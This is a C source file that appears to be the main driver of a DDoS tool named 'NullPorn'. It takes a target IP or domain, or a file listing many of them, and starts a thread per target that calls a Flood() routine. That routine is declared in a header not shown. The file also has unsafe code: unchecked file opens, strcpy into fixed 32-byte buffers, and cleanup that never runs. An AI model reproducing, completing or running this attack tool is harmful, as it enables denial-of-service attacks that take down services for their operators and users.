#include "DDoS.h"

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <getopt.h>
#include <pthread.h>

typedef enum FileType_t
{
    FileType_None,

    FileType_IpAddresses,
    FileType_Domains,
} FileType;

static char* OpenFile(const char* filepath)
{
    FILE* file = fopen(filepath, "r");
    if (!file)
        fprintf(stderr, "[ERR]: Could not open file @ %s.\n", filepath);

    fseek(file, 0, SEEK_END);
    size_t size = ftell(file);
    rewind(file);

    char* buffer = (char*) malloc(size+1);
    fread(buffer, size, 1, file);
    buffer[size] = 0;

    return buffer;
}

int main(int argc, char* argv[])
{
    FileType fileType = FileType_None;
    bool fileRead = false;

    char filepath[32];
    char* fileBuffer;

    int option = 0;
    while ((option = getopt(argc, argv, "d:D:i:I:")) != -1)
    {
        switch(option)
        {
        case 'i': {
                char ip[32];
                strcpy(ip, optarg);
                Flood(ip);
                return 0;
            } break;

        case 'd': {
                char domain[32];
                strcpy(domain, optarg);
                char* ip = DNSLookup(domain); 
                Flood(ip);
                free(ip);
                return 0;
            } break;

        case 'D': {
                strcpy(filepath, optarg);
                fileBuffer = OpenFile(filepath);

                fileRead = fileBuffer != NULL;
                fileType = FileType_Domains;
            } break;

        case 'I': {
                strcpy(filepath, optarg);
                fileBuffer = OpenFile(filepath);

                fileRead = fileBuffer != NULL;
                fileType = FileType_IpAddresses;
            } break;
                         
        default: {
                fprintf(stderr, "[USAGE]: \"sudo ./NullPorn -[iIdD] [arguments]\".\n");
                return -1;
             } break;
        }
    }
   
    size_t numberLines = 0;
    for (uint32_t i = 0; i < strlen(fileBuffer); i++)
        if (fileBuffer[i] == '\n')
            numberLines++;
    char** lines = (char**) malloc(sizeof(char*) * numberLines);
    for (uint32_t i = 0; i < numberLines; i++)
        lines[i] = (char*) malloc(32);

    char* token = strtok(fileBuffer, "\n");
    size_t index = 0;
    while (token != NULL)
    {
        strcpy(lines[index], token);
        token = strtok(NULL, "\n");
        index++;
    }
   
    pthread_t* threads = (pthread_t*) malloc(sizeof(pthread_t) * numberLines);
    for (uint32_t i = 0; i < numberLines; i++)
    {
        if (fileType == FileType_Domains)
            pthread_create(&threads[i], NULL, Flood, DNSLookup(lines[i]));
        else if (fileType == FileType_IpAddresses)
            pthread_create(&threads[i], NULL, Flood, lines[i]);
    }
    
    pthread_exit(NULL);

    if (fileRead)
    {
        free(threads);
        for (uint32_t i = 0; i < numberLines; i++)
            free(lines[i]);

        free(lines);
        free(fileBuffer);
    }
}
